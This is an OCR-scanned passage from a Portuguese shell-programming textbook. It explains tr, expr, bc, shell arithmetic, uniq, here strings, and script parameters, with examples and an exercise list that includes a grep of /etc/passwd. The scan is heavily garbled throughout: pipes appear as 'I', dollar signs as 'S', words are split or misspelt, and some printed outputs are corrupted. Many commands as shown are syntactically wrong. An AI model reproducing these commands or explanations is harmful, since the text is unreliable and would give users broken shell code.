_j \caractere 
nificado 
\\ 
backslash 
\ a 
audible BEL 
\ b 
backspace 
\ f 
form feed 
\ n 
new line 
\ r 
retum 
\ t 
horizontal tab 
\ v 
vertical tab 
Assim sendo, o exemplo anterior também poderia ser escrito da seguinte 
. 
mane1ra: 
$ cat c onfus ao I t r •;" "\n" 
Converte; em <ENTE R> 
1 Qrl 
Comandos que não são do Planeta 
141 
Agora veja só esse exemplo: 
$ echo SPATH 
/usr/bin : /usr/local/bin : /usr/sbin/ . 
Complicado para ler, né? Agora experimente: 
$ echo SPATH I tr : "\012" 
/usr/bin 
/usr/l ocal /bin 
/usr/sbin 
O maior uso desse comando é, no entanto, transformar maiúsculas em 
minúsculas e vice-versa. Vejamos como converter as letras maiúsculas de 
quequeisso em letras minúsculas: 
$ cat quequeisso I tr 'A-Z' 'a-z ' 
aeencao, o eexto abaixo nao eh treinamento, 
oh uma lavagem cerebral !!! 
o shell alem de analisar cada dado entrado a partir do pron~t do UNIX, 
1nterfaceando com os usuarios, tem ~ambem as seguintes atribuicoes : 
interpretador de comandos; 
controlo do ambiento UNIX; 
redirecionamento de entrada e saída; 
substi tui cao de nomes de arquivos ; 
concatenacao de pipe ; 
execucao de progr amas; 
poderosa lin<J\•agem de programacao . 
ATINÇÃO 
A notação "m-n " expande para todos os caracteres de m a n, em 
ordem ascendente. m deve ser menor que n; caso contrário ocor-
rerá um erro. Por exemplo, " 0-9" é o mesmo que "0123456789". 
Esta notação é típica do LINUX. Em outros Sistemas Operacio-
nais (como o System V), pode ser obrigatório o uso dos colche-
tes, e o exemplo acima ficaria da seguinte forma: 
$ tr • {A-Z) • '{a- z]' < quequeisso 
O comando tr pode ainda ser usado com duas opções interessantes: 
A opção -s 
Funciona da mesma maneira que vimos até agora, porém, se houver re-
petição de algum dos caracteres pesquisados, "espreme-os" (§queeze), 
gerando somente um na saída. 
Copyr ht 
142 Programação SheU Linux 
Exemplo: Se quisermos trabalhar com a saída de um comando, compactan-
do os espaços em branco, podemos fazer: 
$ l s - 1 I tr - s 
' ' 
total 1170 
Comprimindo os espaços do comando /s -1 
- r1~xr -- r --
1 julio dipao 241 Oct 28 1997 2ehbom 
- rw- r - -r-- 1 julio dipao 1463 Nay 21 10: 55 ArqOLs 
- r,.rxr--r - -
1 julio dipao 127 Oct 14 1997 OuLoren 
- rw- r-- r--
1 julio dipao 16 Oct 19 18 : 59 a a 
-.r\o~xr--r-- 1 julio dipao 114 ocr 7 1997 add 
Agora veja um arquivo recebido do DOS, com seus caracteres de con-
trole característicos: 
$ cat -vet oos.txt 
Est e arquivo"!-!$ 
foi gerado pelo"!•!$ 
DOS/Rwin e foi AI~$ 
bai:<ado po: um"M$ 
ftp mal feito . AMS 
Para tirá-los podemos fazer: 
$ tr -s • (:cntrl : )' ' \n' < OOS.txt I cat -vet 
Est e arqui vo$ 
foi gerado pelo$ 
DOS/R·..,in e foi$ 
baixado por wn$ 
ft p =1 feil:o . $ 
Como o carn'age-retum (representado por "t1 no exemplo) e o line-feed 
(\n representado por s) apareciam lado a lado, quando fizemos a troca do "M 
pelo \n, surgiu um \n\n que a opção -s transformou em apenas um. O últi-
mo cat -vet foi apenas para mostrar que a saída havia se livrado do "M . 
A opção -d 
Usando-se essa opção, os caracteres que atendem ao critério de pesquisa 
são deletados. 
Exemplo: 
$ tr - d ' \12 ' < quequeisso 
Detetar todos os <ENTER> de quequeisso 
ATEIICAO, O TEXTO ABAIXO Ni\0 EH TREINI\.I>!EN'!O, E!! UMA LAVAGEH CEREBRAl, ! ! !O 
Shell alem de analisar cada dado enteado a partir do prompt do 
Copyr ht 
Comandos que não são do Planeta 
143 
UN!X,incerfaceando com os usuarios, cem cambem as seguintes atcibuicoes : Interpre-
tador de canandos ; controle do aJl'biente UNIX; Redirecionamento de entrada e saida; 
Substituicao de nar.es de arquivos; Concatenacao de plpe; Execucao de programas; 
?ode rosa linguagem de program.1c<1o. S 
Prompt no final porque perdeu até o último <ENTE R> 
Também podemos nos livrar do indesejado " N do arquivo oos . t:xt visto 
há pouco, fazendo o seguinte: 
s tr - d ' \ r ' < oos . txt > oos.ok 
$ cat - vet OOS .ok 
Este arquivo~ 
foi gerado pel o$ 
DOS/R-,.;in e foi$ 
baixado por um$ 
ftp mal feito . 
Ou assim: 
s tr -d ' \015' < oos.txt > oos .ok 
A opção -c 
Essa opção troca o complemento, ou seja, troca o que não foi especificado 
no conjunto de <dos-caracteres> . 
Exemplos: 
Vamos transformar o arquivo oos . ok em uma lista de palavras: 
$ tr - cs '( :lower:] (:upper:] ' '(\n*]' < OOS.ok I paste -
-
-
-
Este 
a.rquivo foi 
gerado 
pelo 
DOS 
R\ltin 
e 
foi 
bai:<ado por 
um 
ft p 
mal 
feito 
Esse exemplo transforma cada sequência de caracteres que não sejam 
letras maiúsculas e minúsculas (no caso, caracteres em branco, especiais 
e o <ENTER> do final de cada linha) em um simples <ENTER> (\n). 
Sempre o tamanho de <dos-caracteres> tem de ser o mesmo de <para-
os- caracteres>, o asterisco foi colocado para que <para-os-caracteres> 
adquira o tamanho suficiente para isso. O uso deste asterisco ('* > no tr 
não GNU é obrigatório. Para finalizar o paste foi colocado somente para 
Copyr ht 
144 Programação Shell Linux 
que fossem escritas quatro palavras por linha, de forma a não gastar uma 
página inteira do livro para isso. ; - 1 
Ahhh, já ia me esquecendo! Como poderia haver caractere especial co-
lado em espaço em branco, coloquei a opção - s para que isso não resul-
tasse em linhas vazias provocadas por dois <ENTER> sucessivos após a 
execução do t r . 
Só consegui fazer o mesmo em um UNIX SVR4 da seguinte forma: 
$ tr - cs "(A- Z ] (a- z]" "[\012 * )" < DOS . ok I paste -
-
-
-
Exprimindo o expr de forma expressa 
O expr é o nosso comando "bombril", isto é, tem 1 001 utilidades. Vejamos 
. . . 
as pnnc1pa1s: 
Execução de operações aritméticas 
As operações aritméticas são executadas com auxílio do comando expr. 
Os operadores são: 
Exemplos: 
$ expr 2+7 
2+7 
$ expr 2 + 7 
9 
$ expr 2 -
7 
- 5 
$ expr 2 • 7 
+ -
• 
I 
% 
expr : syntax error 
$ expr "2 • 7" 
2 • 7 
Soma 
Multiplicação 
Divisão 
Resto da divisão 
Resto da divisão 
Que foi que houve? ... 
/v;}or4 sim. com espiiÇO sep4rendo operadotes 
Zebra, faJta proteger o asterisco 
/lf,Jota eu protegi a expressão toda .. 
1 Qrl 
$ expr 2 \ • 7 
14 
$ expr 2 % 7 
2 
$ oxpr 7 % 2 
1 
Comandos que não são do Planeta 
145 
Agora sim ... 
ATEN ÀO 
Precisamos de cautela na execução desse comando, já que ele 
trabalha somente com números inteiros. Podemos, nesse caso, 
dizer que: a ordem dos tratores altera o pão duro. Olha só o exem-
plo a seguir: 
$ expr 7 I 5 \ • 10 
10 
$ axpr 7 \ * 10 I 5 
14 
7 dividido por 5 = 1 (inteiro), vezes 10 = 10 
7 vezes 10 = 70 dividido por 5 = 14 
Já que esta publicação é mais um bate-papo de amigos do que um li-
vro formal, vamos subverter a ordem natural das coisas e apresentar para 
vocês outras formas de fazer operações aritméticas, fora do contexto do 
expr . Daqui a pouco voltaremos ao expr. 
bc - A calculadora 
Uma forma bacana de fazer cálculos em She/1- usada normalmente quan-
do a expressão aritmética é mais complexa, ou quando é necessário tra-
balharmos com casas decimais - é usar a instrução calculadora do UNIX/ 
LINUX. O bc . Veja como: 
Exemplo: 
$ echo " (2 + 3) * s•• 1 bc 
25 
Parênteses 11sados para dar precedência 
Para trabalhar com números reais (números não necessariamente intei-
ros), especifique a precisão (quantidade de decimais) com a opção scale 
do comando bc. Assim, vejamos o penúltimo exemplo: 
$ echo "scal<r-2; 7*513" 1 bc 
11.66 
Copyr ht 
146 Programação SheU Linux 
Outros exemplos: 
$ acho •seale=3; 33.333*3" 1 be 
99 . 999 
$ nWil"5 
S eeho • seale~2; ( (3 + 2) • Snwn + 4) I 3" I b e 
9 . 66 
Uma vez apareceu na lista (excelente por sinal) de Shefl script no Yahoo 
(http://br.groups.yahoo.com/group/shell-script/) um cara com a seguinte dú-
vida: "Eu tenho um arquivo cujos campos estão separados por <TAB> e o 
terceiro deles possui números. Como posso calcular a soma de todos os 
números desta coluna do arquivo?" 
Mandei a seguinte resposta: 
$ eeho S (eut -f3 num I tr '\n' +)0 1 be 
20 . 1 
Vamos por partes para entender melhor e primeiramente vamos ver 
como era o arquivo que fiz para teste: 
S ea.t num 
a 
b 
3 . 2 
a 
z 
4. 5 
w 
e 
9 . ó 
q 
" 
2 . 8 
Como se pode ver, está dentro do, padrão do problema, onde eu tenho 
como terceiro campo números reais. Vamos ver o que faria a primeira parte 
da linha de comandos, onde eu transformo os caracteres <ENTER> (new-
line) em um sinal de mais I +>: 
$ cut -f3 num I tr '\n' + 
3 . 2+ 4. ~+9 . 6+2 . 8+ 
Se eu mandasse desse jeito para o bc, ele me devolveria um erro por 
causa daquele sinal de mais l+l solto no final do texto. A minha saída foi 
colocar um zero no final, pois somando zero o resultado não se alterará 
Vamos ver então como ficou: 
$ oeho S(eut -f3 num I tr - s '\n' +)0 
3 . 2+4.5+9 . 6+2 . 8+0 
Copyr ht 
Comandos que não são do Planeta 
147 
Isso é o que se costuma chamar one-liner, isto é, códigos que seriam 
complicados em outras linguagens (normalmente seria necessário criar 
contadores e fazer um loop de leitura somando o terceiro campo ao conta-
dor) e em She/1 são escritos em uma única linha. 
Há também gente que chama isso de método K/SS, que é o acrônimo de 
Keep Jt Si mp/e Stupid. :-1 
Mas o potencial de uso dessa calculadora não se encerra ai, existem 
diversas facilidades por ela propiciadas. Veja só este exemplo: 
$ echo "obase=16; 11579594" I bc 
BOBOCA 
$ echo "iba so=16; BOBOCA" I bc 
11519594 
B, zero, B. zero, C e A 
Nesses exemplos vimos como faz.er mudanças de base de numeração 
com o uso do bc. Na primeira explicitamos a base de saída cobaseJ como 
16 (hexadecimal) e na segunda, dissemos que a base da entrada (ibasel 
era 1 O (decimal). 
O interpretador aritmético do Shell 
Outra forma muito legal de fazer cálculos é usar a notação s c cexp arit-
mética! 1. É bom ficar atento, porém, ao fato de essa sintaxe não ser uni-
versalizada. O Bourne She/1 ( sh), por exemplo, não a reconhece. 
Exemplo: 
Usando o mesmo exemplo que já havíamos usado: 
$ echo $ ( ( (2+3) *5)) 
25 
Agora olha só esta maluquice: 
$ tres=3 
$ eoho $(((2+tres)*5 )) 
25 
$ eoho $ ( ( (2+$tres) *5)) 
25 
Os parênteses mais internos priorizaram o 2tJ 
Variável lrés não precedida pelo S 
Variável lrés precedida pelo $ 
Copyr ht 
148 Programação SheU Linux 
Ué!! Não é o cifrão precedente que caracteriza uma variável? Sim, po-
rém em todos os sabores UNIX que testei, sob bash ou ksh, ambas as 
formas de construção produzem uma boa aritmética. 
Preste atenção nesta sequência: 
$ unset i 
$ Gcho $ ( (i++)) 
o 
$ echo Si 
1 
$ echo $ ((++i)) 
2 
$ echo $i 
2 
$i mooorreu! 
Repare que apesar de a variável não estar definida, pois foi feito um 
unset nela, nenhum dos comandos acusou erro, porque, como estamos 
usando construções aritméticas, sempre que uma variável não existe, é 
inicializada com zero !O> . 
Repare que o i++ produziu zero tO> • Isso ocorre porque este tipo de 
construção chama-se pós-incrementação, isto é, primeiramente o coman-
do é executado, e só então a variável é incrementada. No caso do ++i , 
foi feita uma pré-incrementação: primeiro incrementou e somente após o 
comando foi executado. 
Também são válidos: 
$ echo $((i+• 3)) 
5 
$ ocho $i 
5 
$ ocho $ ( (i*=3)) 
15 
$ echo Si 
15 
$ echo $((i%=2) ) 
1 
$ echo $i 
1 
Essas três operações seriam o mesmo que: 
ia$ ( {i+3) ) 
ia$( {P3 ) ) 
i = S( (i ~ 2l) 
Copyr ht 
Comandos que não são do Planeta 
149 
E isso seria válido para todos os operadores aritméticos, o que em resu-
mo produziria a tabela a seguir: 
Expressão 
Resultado 
id++ i d--
pós-incremento e pós-decremento de variáveis 
++id --id 
pré-incremento e pré-decremento de variáveis 
** 
exponenciação 
* I " 
multiplicação, divisão, resto da.divisão 
+ -
adição, subtração 
<• >• < > 
comparação 
= 
I= 
igualdade, desigualdade 
&& 
E lógico 
l i 
OU lógico 
O auge dessa forma de construção com duplo parênteses é o seguinte: 
$ ocho $var 
50 
$ var-$ ( (var>40 ? va:r- 40 
var+ 40)) 
$ echo $var 
10 
$ var=S({var>40? var -40 
var+40)) 
$ echo $var 
50 
Esse tipo de construção deve ser lido da seguinte forma: caso a variável 
va r seja maior que 40 (var >IIO) , então (?) faça var igual a var menos 
40 (var- 40) , senão (: l faça var igual a var mais 40 (var+40) . O que 
quis dizer é que os caracteres ponto de interrogação (?J e dois pontos 1: 1 
fazem o papel de "então" e "senão", servindo dessa forma para montar uma 
operação aritmética condicional. 
Da mesma forma que usamos a expressão s < ( . . . 1 1 para fazer opera-
ções aritméticas, também poderíamos usar a intrínseca (built-in) let ou 
construção do tipo s [ ... 1 . 
1 Qrl 
150 Programação SheU Linux 
Os operadores são os mesmos para essas três formas de construção, o 
que varia um pouco é a operação aritmética condicional com o uso do l et . 
Vejamos como seria: 
$ acho $var 
50 
$ let va~
• var>40 ? var-40 
var+40' 
$ echo $var 
lO 
$ let va~ ' var>4 0 ? var-40 : var+40' 
$ echo $var 
50 
Se você quiser trabalhar com bases diferentes da decimal, basta usar o 
formato: 
ba:seHnumero 
Onde base é um número decimal entre 2 e 64 representando o sistema de 
numeração, e numero é um número no sistema definido por base . Se baseU 
for omitida, então 10 é assumida como default. Os algarismos maiores que 9 
são representados por letras minúsculas, maiúsculas, @ e _, nessa ordem. 
Se base for menor ou igual a 36 maiúsculas ou minúsculas podem ser 
usadas indiferentemente para definir algarismos maiores que 1 O (não está 
mal escrito, os algarismos do sistema hexadecimal, por exemplo, variam 
entre O (zero) e F). Vejamos como isso funciona: 
$ echo $[21ll] 
3 
$ ocho $ ( (l6#a.)) 
lO 
$ echo $ ( (l6HA)) 
10 
$ echo $ ((2811 + l6Na)) 
13 
$ ocho $(64ila] 
10 
$ echo $ [ 64HA] 
36 
$ echo $ ( ( 64*@)) 
62 
$ echo $ ( (6411_ )) 
63 
Nesses exemplos usei as notações s < < ••• 1 > e s 1 ... 1 indistintamente, 
para demonstrar que ambas funcionam. 
Copyr ht 
Comandos que não são do Planeta 
151 
Ah, já ia me esquecendo! As expressões aritméticas com os formatos 
s! ! ... l l , s [ .. . J e com o comando l et usam os mesmos operadores 
usados na instrução expr , além dos operadores unários !++, - - , += , *=, 
. .. l e condicionais que acabamos de ver. 
Por falar em expr, está na hora de sairmos da nossa viagem e voltar-
mos ao assunto sobre esta multifacetada instrução. Para medir o tamanho 
de uma cadeia de caracteres, a usamos com a sintaxe: 
expr length cade i a 
Exemplo: 
Assim: 
$ expr length 5678 
4 
4 é o tamanho da cadeia 5678 
Lá vou eu novamente sair do tema expr para mostrar outra forma de obter-
mos o tamanho de uma cadeia. Observe que a próxima solução só poderá ser 
empregada para devolver o tamanho de uma cadeia contida em uma variável. 
Note também que esta sintaxe só é reconhecida pelo bash e pelo ksh. 
$ var=0123456789 
$ e cho ${#var} 
10 
Esse tipo de construção < s { ... l ) que acabamos de ver é genericam en-
te chamada de Expansão de Parâmetro (Parameter Expansion). 
Encorajo muito seu uso, apesar da perda de legibilidade do código, 
porque elas são intrínsecas do Shell (builtins) e por isso são, no mínimo, 
umas 100 vezes mais velozes que as suas similares. 
Veremos a Expansão de Parâmetros de forma muito mais detalhada no 
capítulo 7. 
Voltando à vaca fria, o expr, para extrair uma subcadeia de uma cadeia 
de caracteres, usamos a sintaxe: 
expr subst r cadei a <a partir da posi ção> <qtd . caract eres> 
Exemplo: 
Assim: 
$ e xpr substr 5678 2 3 
Extrair a partir da 2• posição 3 caracteres 
Material com direitos autorais 
152 Programação SheU Linux 
678 
$ expr substr •que teste chato" ll 5 
chato 
Extrair a partir da W posiç~o 5 caracteres 
O Bash, e somente o Bash, permite extrair uma subcadeia de uma ca-
deia da seguinte forma: 
$ var-"qua teste chato" 
$ ecbo ${var:l0:5} 
chaco 
Note que, no caso mostrado no exemplo anterior, a origem da contagem 
é zero, isto é, a letra q da variável var ocupa a posição zero. 
Essa Expansão de Parâmetros que acabamos de ver, também pode ex-
trair uma subcadeia, do fim para o principio, desde que seu segundo argu-
mento seja negativo. 
$ echo ${TimeBom: -5} 
mengo 
$ echo S{Ti meBom:-5} 
Flamenqo 
S echo S{TimeBom: (-5)} 
mengo 
Existe outra Expansão de Parâmetros, que veremos mais tar-
de, que tem a sintaxe s ( parm: -valor J e por isso não podemos 
colar o hífen 1- J aos dois pontos 1 : 1 . Como vimos, podemos 
usar um espaço em branco ou até mesmo usar parênteses 
para separar os dois sinais. 
Para encontrar um caractere em uma cadeia, usamos a sintaxe: 
expr ~ndex cadeia carac cer 
Exemplo: 
Assim: 
$ expr index 5678 7 
3 
Agora olhe só para isto: 
$ expr inde.x 5678 86 
2 
Em que posição de 5678 está o 7? 
1\latcna com d r bS utor<t 
Comandos que não são do Planeta 
153 
Isso aconteceu porque o e xpr i ndex não procura uma subcadeia em 
uma cadeia e sim um caractere. Dessa forma, estava pesquisando a ocor-
rência dos caracteres a e 6 na cadeia 5678. Ora, como o 6 foi o primeiro a 
ser encontrado, a instrução retornou a sua posição relativa na cadeia. 
O uniq é único 
É particularmente útil quando desejamos trabalhar com os registros dupli-
cados de uma entrada. Este comando é o un i q, cuja sintaxe é a seguinte: 
uniq [entrada) [saida] 
Usado assim sem argumentos, o comando copia todos os registros da 
ent r ada para a saida , exceto os duplicados. 
Exemplo: 
Como preparação do exemplo a seguir, vamos extrair o primeiro nome 
de cada registro do arquivo t.e l e fones e colocá-los em tele f : 
~ cat telefones I c ut - f l -d" "> t e l ef 
como ficou o telef? 
~ c a t t e l ef 
Ci ro 
Ney 
Enio 
Cl audi a 
Paula 
Ney 
Repare que o nome Ney aparece duas vezes em t e l e f. Então vamos 
ver se é mesmo verdade que a instrução u ni.q, na sua forma mais simples, 
não manda para a saída os registros duplicados: 
~ uniq telef 
Ci ro 
Ney 
Enio 
Claudia 
Paula 
Ney 
Não funcionou! Que será que houve? 
O nome do Ney continua aparecendo duas vezes na saída porque em 
tele f eles não eram consecutivos. Para fazer o pretendido, isto é, colocar 
adjacentes os registros que desejamos selecionar, é frequente o uso do 
Material com direitos autorais 
154 Programação SheU Linux 
comando sott, passando a sua salda para a entrada do uniq . Vamos 
então fazer assim: 
$ sor t talef I uniq 
Ciro 
Claudi a 
E:nlo 
lley 
Paula 
Agora sim funcionou, mas esse exemplo pode (e deve) ser resolvido, de 
forma mais rápida e enxuta, se fizermos: 
$ sort telefones I cut -fl -d" • I uni q 
Ciro 
Cl audia 
Enio 
Ney 
Paula 
O comando uniq possui outras opções, mas em uma devemos ir mais 
fundo. 
A opção -d 
Usamos essa opção quando desejamos listar somente os registros que 
estão duplicados no arquivo de entrada: 
Exemplo: 
Suponha que seja regra, na instalação em que você trabalha, que cada 
usuário do computador possa ter somente uma sessão aberta. Para listar 
todos os que estão conectados você pode fazer: 
$ who 
ht:rece 
console 
De c 
2 17 : 12 
d egarie. 
pt5/0 
De c 
2 08 : 50 
lcarlos 
pt:s/4 
De c 
2 16: 08 
r l egaria 
pts/1 
De c 
2 08 : 51 
jneves 
pts/2 
De c 
2 09 : 42 
Como existem poucas sessões abertas, fica fácil de ver que r legaria fez 
dois logins, mas para ficar visivel, independente da quantidades de usuários, 
devemos fazer: 
$ who I cut - fl - d" " I sort I uniq - d 
rl ttga.ria 
1\latcna com d r bS utor <t 
Comandos que não são do Planeta 
155 
Isto é, da saída do comando who , extraímos somente o primeiro campo 
separado dos outros por espaço(s) em branco (login name). Esses campos 
foram classificados, e então listamos os duplicados. 
Mais redirecionamento sob o Bash 
Agora que nós temos um pouco mais de bagagem técnica, podemos entender 
o conceito do here strings (que funciona somente sob o bom e velho Bash). 
Primeiro, um programador com complexo de inferioridade criou o redireciona-
mento de entrada e representou-o com um sinal de menor (<l para represen-
tar seus sentimentos. Em seguida, outro, sentindo-se pior ainda, criou o here 
document representando-o por dois sinais de menor ( « J porque sua fossa 
era maior. O terceiro pensou: "esses dois não sabem o que é estar por baixo" ... 
Então criou o here strings representado por três sinais de menor ( « < l . 
Brincadeiras à parte, o here strings é utilíssimo e, não sei por quê, é 
um perfeito desconhecido. Na pouquíssima literatura que há sobre o tema, 
nota-se que o here stríngs é frequentemente citado como uma variante do 
here document, com o que discordo pois sua aplicabilidade é totalmente 
diferente daquela. 
Sua sintaxe é simples: 
$ c oroando <<< $c ad eia 
Onde cadeia é expandida e alimenta a entrada primária (stdin) de comand o . 
Como sempre, vamos direto aos exemplos dos dois usos mais comuns 
para que você próprio tire suas conclusões. 
O mais comum é ver uma here string substituindo a famigerada constru-
ção echo "ca deia " 1 comando, que força um fork, criando um subshell e 
onerando o tempo de execução. Vejamos alguns exemplos: 
$ a="l 2 3 " 
$ cu t -f 2 -d ' ' <<< $a 
2 
$ e cho $NomeArq 
Neus Documentos 
$ tr 
1
~"A-Z 
11 
11 a- z_ " <<< $NomeA.rq 
meus documentos 
$ bc <<<" 3 * 2" 
6 
$ bc <<<"scale = 4; 22 I 7" 
3 . 1428 
Normalmente faz-se: echo Sal cul ·f 2 ·d ' ' 
Conserlando nomes gerados no IWÍn 
Substituindo o echo ... I Ir ... 
Material com direitos autorais 
156 Programação SheU Linux 
Vejamos uma forma rápida de inserir uma linha como cabeçalho de um 
arqu1vo: 
$ cat num 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
$ cat - num<<< "Impares Pares" 
O menos (·) represenla o stdin 
Impare" i' ares 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
Exercício 
Descubra o resultado da execução dos comandos seguintes (primeiramen-
te tente identificar a resposta sem o uso de computador, em seguida use-o 
para certificar-se do resultado): 
sed •stUNIXHunixf• quequeisso 
sed ' l,2s/(A-ZJ// ' quequeisso 
sed 'l ,2s/(a- zJ//g• quequeisso 
sec:l ' s/ . *I/' quequeisso 
sed -n '/UNIX/p' quequeisso 
sed '/UNIX/d' quequeisso 
cat quequeisso 
sed ' s/ . *//' 
expr 15 I 2 • 5 
oxpr 15 \* 5 I 2 
finger 1 cut -c10-30 I cut -fl -d" " 
I tr "[a-z)" " [A-Z) " 
grep ' A (P I S) ' quequeisso 
egrep •A (E IC) ' quequei sso 
egrep -v •A(EIC) • quequeisso I wc -1 
fgrep -1 ou * 
grep ecardoso /etc/pass~ti I tr : -
expr length "C qui sabe" 
- ~ -
1\latcna com d r bS utor <t 
? :~ ,~~ j Capítulo 3 
I 
\ 
: 
f , I 
. 
: 
• 
• 
! para programar? 
. . 
i Depois de todo esse blablablá, vamos finalmente ver como 
funciona essa tal de programação em She/1. Eu não quero 
enganar não, mas você já fez vários programas, uma vez 
que cada um dos comandos que você usou nos exemplos 
até aqui é um míniprograma. 
O She/1, por ser uma linguagem interpretada, pode rece-
ber os comandos diretamente do teclado e executá-los ins-
tantaneamente, ou armazená-los em um arquivo (normal-
mente chamado de script) que, posteriormente, pode ser 
processado tantas vezes quanto necessário. Até aqui o que 
vimos enquadra-se no primeiro caso. Veremos agora o que 
fazer para criarmos os nossos arquivos de programas. 
Executando um programa 
(sem ser na cadeira elétrica} 
Vamos mostrar o conteúdo do arquivo Duloren: 
$ cat DuLoren 
Do 12 scripl a gente nunca se esquece ... 
# 
# 
Meu Pri meiro Script em Shel l 
li 
echo Eu t enho · cat tel efones I wc - 1 · telef ones cadast rados 
e cho " Que s ao : n 
cate te l e f on es 
157 
Material com direitos autorais 
158 Programação SheU Linux 
Ih! É um programa! Vamos então executá-lo: 
S DuLoren 
ksh: OuLoxen: cannot execute 
Ué, se é um programa, por que não posso executá-lo? 
$ ls - 1 DuLoren 
- rw- r-- r --
1 julio 
dipao 
90 S~p 29 16: 19 DuLor~n 
Para ser executável, é necessário que aqui haja um ! 
Então, devemos antes de tudo fazer: 
S chmod 744 OuLoren 
$ ls -1 OuLoren 
-n<xr--r--
l j ulio 
Agora sim!! 
clipao 
Então vamos ao que interessa: 
$ OuLoren 
Eu tenho 6 telef ones cadastrados 
Que sao: 
Ciro Grippi 
Ney Gerhardt: 
Enio Cardoso 
(021)555- 1234 
(024) 543-437.1 
(023) 232-3423 
Cl audia Marc ia 
(021)555-2112 
?aula Duarte 
(011)449-0989 
Hey Garrafas 
(021)988-3398 
Usando variáveis 
ou $ chmod +x OuLoren 
90 Sep 29 16:19 DuLoren 
O She/1, como qualquer outra linguagem de programação, trabalha com va-
riáveis. O nome de uma variável é iniciado por uma letra ou um sublinhado 
(J, seguido ou não por quaisquer caracteres alfanuméricos ou caracteres 
sublinhado. 
Para criar variáveis 
Para armazenar ou atribuir valor a uma variável, basta colocar o nome da 
variável, um sinal de igual c=> colado ao nome escolhido e, colado ao sinal 
de igual, o valor estipulado. Assim: 
1\latcna com d r bS utor <t 
Exemplo: 
S variavel=qqcoisa 
$ contado:t- 0 
$ vazio• 
Viemos aquí para falar ou para programar? 
159 
Armazena qqcoísa em variável 
Coloca zero na variável contador 
Cria a variável vazio com o valor nulo (NULL) 
Repare nos exemplos anteriores que, ao atribuirmos valor 
a uma variável, não colocamos espaços em branco no cor-
po dessa atribuição, sob pena de ganharmos um erro, pois 
linhas contendo espaços em branco são tratadas pelo Shell 
como comandos (Vide Capítulo 0). 
Para exibir o conteúdo das variáveis 
Para exibirmos o valor de uma variável, devemos preceder o seu nome por 
um cifrão <S>. Assim, se quisermos exibir o conteúdo das variáveis criadas 
antes, faríamos: 
Exemplo: 
$ echo variavel•Svariavel , contador•$contador, vazio•Svazio 
variavel=qqcoisa, contador=O, vazio= 
Se desejarmos preceder a variável contador do número zero para for-
matar números como o o, 01. ... , on: 
$ echo O$contador 
00 
Da mesma forma que concatenamos caracteres antes da variável, pode-
mos fazê-lo após: 
$ echo $variável- jilo 
qqcoisa-jilo 
S echo Scontadorl 
$ 
Concatenar ao conteúdo de $variável, literal-filo 
COI1Celenar ao conteúdo de Sconlador,literel f 
No último exemplo, o resultado foi nulo porque o She/1 interpretou o co-
mando como uma solicitação para que seja exibido o conteúdo da variável 
contador1. Como tal variável não existe, o valor retornado será nulo. 
11 fatcna com d r bS utor<t 
160 Programação SheU Linux 
Por que o interpretador entendeu Svariavel- jilo e encrencou com 
svariavell? Bem, conforme você já sabe, o nome de uma variável só com-
porta caracteres alfanuméricos e o caractere sublinha u , dessa forma 
svariável - Jilo não será interpretado como uma variável, já que contém o 
caractere menos 1-), porém scontadorl sim. 
Como fazer então? Um dos recursos que o Shell utiliza para delimitar 
variáveis é colocá-las entre chaves ( 1 1 > • Dessa forma, para solucionar o 
problema, poderíamos fazer: 
Exemplo: 
$ ocho $ {contador }l 
O contador tem O, e colocamos o 1 a seguir 
Passando e recebendo parâmetros 
Suponha que você tenha um programa chamado listdir, assim: 
$ cat listdir 
ccho os Arquivos d o Dircco.rio corrcm:e sao : 
ls - 1 
Que quando executado geraria: 
$ list dir 
Os Arquivos do Diretorio Corrente Sao : 
- .n~xr-- r --
l julio 
dipao 
90 Sep 29 16 : 19 DuLoren 
- .n<xr-- r--
1 julio 
dipao 
51 Sep 29 17 : 46 listdir 
-r\<-r--r--
1 julio 
dipao 
416 Sep 
3 10 :53 quequeisso 
-rw- r--r--
1 julio 
dipao 
137 Sep 
9 11 : 33 telefones 
Ora, esse programa seria estático, só listaria o conteúdo do diretório cor-
rente. Para tornar o programa mais dinâmico, nosso script deveria receber 
o nome do diretório que desejássemos listar. Dizemos que estamos execu-
tando um script passando parâmetros, e sua forma geral é a seguinte: 
progr parrnl pa.1:1112 pa:rm3 . . . pa.rmn 
Isto é, chama-se o programa da forma habitual e, em seguida, separa-
dos por espaços em branco, vêm os parâmetros. 
Sobre essa chamada de progr anterior, devemos nos ater a diversos 
detalhes: 
1\latcna com d r bS utor<t 
Viemos aquí para falar ou para programar? 
161 
Os parâmetros passados (parml, parm2 . .. parmn l dão origem, den-
tro do programa que os recebe, às variáveis Sl, s2, S3 .... sn. É 
importante notar que a passagem de parâmetro é posicional, isto é, o 
primeiro parâmetro é o Sl, o segundo s2 e assim sucessivamente, 
até $9 . 
Exemplo: 
$ cat parwnl 
echo $1 
echo $ 2 
echo $11 
$ paraml l. 2 . 3 . 4. S. 6 . 7 . 8 . 9 . l O. LL. 
l . 
2 . 
1.1 
Programa sobre passagem de parâmetros 
Lista t• parâmetro 
Lista 2l pllrâmelro 
Lista 11• parãmelro 
Exeruta programa passando 11 parãmetros 
Listou t• parâmetro 
Listo11 2' parâmetro 
VocéespertNa11. E deu I. t!Dllpta eriet!det? 
A explicação para o que acontece lU com o 112 parâmetro é que, apesar 
do She/1 não limitar a quantidade de parâmetros que podem ser passados, 
só é possível endereçar diretamente· até o 92 parâmetro. Dessa forma, o 
que o She/1 viu foi o parâmetro sL seguido no dígito 1 . 
-
A variável so conterá o nome do programa. 
Exemplo: 
$ cat param2 
echo $0 
echo $2 
echo $11 
$ param2 1 . 2. 3. 4. 5. 6. 7. 8 . 9. 10. ll. 
Programa exemplo da variável $0 
Linha alterada em relm;ào 80 anterior 
pa ram2 
O parllmetro SO devolveu o nome do prg 
2 . 
1.1 
A variável s ii conterá a quarntidade de parâmetros recebida pelo 
programa. 
Exemplo: 
$ cat para.m3 
echo O Programa SO Recebeu SK Parãmecros 
echo $1 
echo $2 
echo $1L 
Observe o SO e o S# inc/u/dos nesta fnhs 
11 fatcna com d r bS utor<t 
162 Programação SheU Linux 
$ param3 1. 2. 3. 4. S. 6. 7. 9. 9. 10. 11. 
O Programa param3 Recebeu ll Parámetros 
l . 
2 . 
1.1 
$0 gerou nome do prg e S# o total de parãmelros 
A variável $* contém o conjunto de todos os parâmetros separados 
por espaços em branco. 
Exemplo: 
$ cat param4 
